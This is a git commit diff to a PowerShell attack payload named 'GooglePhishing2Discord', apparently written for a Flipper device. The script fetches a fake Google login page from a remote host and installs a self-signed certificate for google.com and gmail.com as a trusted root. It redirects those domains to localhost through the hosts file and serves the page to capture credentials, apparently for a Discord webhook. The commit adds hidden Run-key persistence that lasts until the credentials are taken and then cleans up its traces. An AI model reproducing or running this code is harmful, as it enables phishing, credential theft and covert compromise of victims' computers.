c52181b5d7a8009a337e3ba425b8fd30fc65c906
Oscar <oscarrc.web@gmail.com>
2023-07-10 09:20:27 +0200

    [MOD] Persist until credentials exfiltrated

--- payloads/GooglePhishing2Discord/script.ps1
+++ payloads/GooglePhishing2Discord/script.ps1
@@ -1,27 +1,3 @@
-if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
-    Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
-
-    $dnsNames = "localhost", "google.com", "*.google.com", "gmail.com";
-    $cert = New-SelfSignedCertificate -DnsName $dnsNames -CertStoreLocation "cert:\LocalMachine\My" -KeySpec Signature -HashAlgorithm SHA256 -KeyExportPolicy Exportable  -NotAfter (Get-Date).AddYears(20)
-
-    $thumbprint = $cert.Thumbprint
-    Export-Certificate -Cert "cert:\localmachine\my\$thumbprint" -FilePath "$env:temp\gph.cer" -Force
-
-    Import-Certificate -filePath "$env:temp\gph.cer" -CertStoreLocation "cert:\LocalMachine\Root"
-    Write-Output $thumbprint
-}
-
-$hostString = "127.0.0.1 google.com`n127.0.0.1 gmail.com";
-$isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;
-
-if ($null -eq $isModified ) {    
-    Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
-    ipconfig /flushdns;
-}
-
-$url = '127.0.0.1';
-$hook="";
-$pageCode = Get-Content "$env:temp\gph.html" -Encoding UTF8 -Raw;
 
 function Handle-Request{    
     [CmdletBinding()]
@@ -36,7 +12,8 @@ function Handle-Request{
         $buffer = [Text.Encoding]::UTF8.GetBytes($pageCode);
         $context.Response.ContentLength64 = $buffer.length;
         $context.Response.OutputStream.Write($buffer, 0, $buffer.length);
-        $context.Response.Close();    
+        $context.Response.Close(); 
+        return false;   
     }
 
     if ($context.Request.HttpMethod -eq 'POST' -and $context.Request.RawUrl -eq '/') {
@@ -57,8 +34,39 @@ function Handle-Request{
         $context.Response.Close();
 
         $listener.Stop();
+        
+        return true;
     }
 }
+
+if(-not (Test-Path -Path "$env:temp\gph.html" -PathType Leaf)){
+    Invoke-RestMethod "https://raw.githubusercontent.com/Agente404/flipper/main/payloads/GooglePhishing2Discord/index.html" -OutFile "$env:temp\gph.html" | Wait-Process;
+
+    $dnsNames = "localhost", "google.com", "*.google.com", "gmail.com";
+    $cert = New-SelfSignedCertificate -DnsName $dnsNames -CertStoreLocation "cert:\LocalMachine\My" -KeySpec Signature -HashAlgorithm SHA256 -KeyExportPolicy Exportable  -NotAfter (Get-Date).AddYears(20)
+
+    $thumbprint = $cert.Thumbprint
+    Export-Certificate -Cert "cert:\localmachine\my\$thumbprint" -FilePath "$env:temp\gph.cer" -Force
+
+    Import-Certificate -filePath "$env:temp\gph.cer" -CertStoreLocation "cert:\LocalMachine\Root"
+    Write-Output $thumbprint
+}
+
+if(-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\gph")){    
+    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gph" -Value ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';Get-Item gph.ps1 | Invoke-Expression;sleep 5;exit'); ;
+}
+
+$hostString = "127.0.0.1 google.com`n127.0.0.1 gmail.com";
+$isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;
+
+if ($null -eq $isModified ) {    
+    Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
+    ipconfig /flushdns;
+}
+
+$url = '127.0.0.1';
+$hook="";
+$pageCode = Get-Content "$env:temp\gph.html" -Encoding UTF8 -Raw;
 
 $http = New-Object System.Net.HttpListener;
 $http.Prefixes.Add(('http://' + $url + ':80/'));
@@ -66,5 +74,11 @@ $http.Prefixes.Add(('https://' + $url + ':443/'));
 $http.Start();
 
 while ($http.IsListening) {
-    Handle-Request $http
+    $caught = Handle-Request $http;
+    
+    if($caught){
+        Remove-Item "$env:temp\gph.ps1" -Force;
+        Remove-Item "$env:temp\gph.html" -Force;
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gph" -Force
+    }
 }
